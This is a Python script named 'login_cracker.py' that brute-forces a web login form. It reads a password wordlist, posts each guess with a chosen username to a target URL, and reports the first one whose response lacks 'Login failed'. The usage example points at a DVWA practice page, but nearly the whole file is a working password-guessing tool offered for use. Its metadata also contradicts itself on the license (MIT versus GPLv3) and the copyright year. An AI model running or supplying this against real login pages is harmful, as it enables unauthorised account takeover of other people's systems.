#!/usr/bin/env python
import argparse
import requests

"""
    Run the script by providing the target_url and the file containing the passwords arguments in the following format:
    
    Usage:
      ./python login_cracker.py --target-url http://192.168.100.32/dvwa/login.php --username admin --password_file ./passwords.txt
      
    The script will try to login with the passwords from the provided file and print the successful password to the terminal, if found.
    
    License:
        MIT License

        Copyright (c) 2023 Marco A. Villarruel

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contact__     = "marco.urquieta@proton.me"
__copyright__   = "Copyright 2013, WildBerry"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__email__       =  "marco.urquieta@proton.me"
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

def try_login(target_url, data_dict, password_file):
    """
    Function to try login with different passwords from the provided file.
    """
    with open(password_file, 'r') as wordlist_file:
        for line in wordlist_file:
            password = line.strip('\r\n')
            data_dict['password'] = password
            response = requests.post(target_url, data=data_dict)
            if "Login failed" not in response.content.decode(errors='ignore'):
                print('[+] Got the password --> ' + password)
                return

    print('[+] Password not found. Reached end of line.')


def main(target_url, username, password_file):
    logo()
    """
    The main function that runs the program.
    """
    data_dict = {'username': username, 'password': '', 'Login': 'submit'}
    try_login(target_url, data_dict, password_file)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Login Cracker')
    parser.add_argument("-t", "--target-url", dest="target_url", type=str,
                        required=True, help="The target URL")
    parser.add_argument("-u", "--username", dest="username", type=str, required=True,
                        help="The username for login")
    parser.add_argument("-p", "--password-file", dest="password_file", type=str,
                        required=True, help="Path to the password file")

    args = parser.parse_args()

    main(args.target_url, args.username, args.password_file)
